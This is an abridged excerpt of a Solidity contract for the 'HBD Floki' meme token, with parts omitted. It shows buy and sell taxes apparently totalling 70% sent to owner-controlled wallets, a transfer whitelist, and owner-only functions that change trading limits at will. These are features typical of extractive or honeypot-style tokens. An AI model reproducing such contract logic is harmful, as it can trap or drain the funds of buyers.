...
/*
    __  ______  ____     ________    ____  __ __ ____
   / / / / __ )/ __ \   / ____/ /   / __ \/ //_//  _/
  / /_/ / __  / / / /  / /_  / /   / / / / ,<   / /  
 / __  / /_/ / /_/ /  / __/ / /___/ /_/ / /| |_/ /   
/_/ /_/_____/_____/  /_/   /_____/\____/_/ |_/___/   
...
contract HBDFLOKI is IERC20, Context, Ownable {
    ...
    address public HBD_Floki_Wallet = 0xF66BA57D9065Ca86d241c809BBc4554a7AdbbC9a;
    address public HBD_Floki_Team_Wallet = 0xF66BA57D9065Ca86d241c809BBc4554a7AdbbC9a;
    
    string private constant _symbol = "HBDFLOKI";
    string private constant _name = "HBD Floki";

    uint256 public HBDFloki_max_Buy = 10000000000000 * 10**9;
    uint256 public HBDFloki_max_Sell = 10000000000000 * 10**9;
    uint256 public HBDFloki_max_Wallet = 20000000000000 * 10**9;
    uint256 public swapTokensAtAmount = 3000000000000 * 10**9;
    ...
    Taxes public sellTaxes = Taxes(0, 60, 10, 0);
    Taxes public taxes = Taxes(0, 60, 10, 0);
    ...
    constructor (address routerAddress) {
        ...
        _isExcludedFromFee[HBD_Floki_Wallet] = true;
        _isExcludedFromFee[HBD_Floki_Team_Wallet] = true;
        
        allowedTransfer[address(this)] = true;
        allowedTransfer[owner()] = true;
        allowedTransfer[pair] = true;
        allowedTransfer[HBD_Floki_Wallet] = true;
        allowedTransfer[HBD_Floki_Team_Wallet] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(from == pair && !_isExcludedFromFee[to] && !swapping){
            require(amount <= HBDFloki_max_Buy, "You are exceeding HBDFloki_max_Buy");
            require(balanceOf(to) + amount <= HBDFloki_max_Wallet, "You are exceeding HBDFloki_max_Wallet");
        }
        
        if(from != pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from] && !swapping){
            require(amount <= HBDFloki_max_Sell, "You are exceeding HBDFloki_max_Sell");
            if(to != pair){
                require(balanceOf(to) + amount <= HBDFloki_max_Wallet, "You are exceeding HBDFloki_max_Wallet");
            }
            if(coolDownEnabled){
    ...
    function swapAndLiquify(uint256 contractBalance, Taxes memory temp) private lockTheSwap{
        ...
        if(marketingAmt > 0){
            payable(HBD_Floki_Wallet).sendValue(marketingAmt);
        }
        uint256 teamAmt = unitBalance * 2 * temp.team;
        if(teamAmt > 0){
            payable(HBD_Floki_Team_Wallet).sendValue(teamAmt);
        }
    }
    ...
    function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external onlyOwner{
        HBDFloki_max_Buy = maxBuy * 10**decimals();
        HBDFloki_max_Sell = maxSell * 10**decimals();
    }
    
    function HBDFloki_Max_Wallet(uint256 amount) external onlyOwner{
        HBDFloki_max_Wallet = amount * 10**decimals();
    }
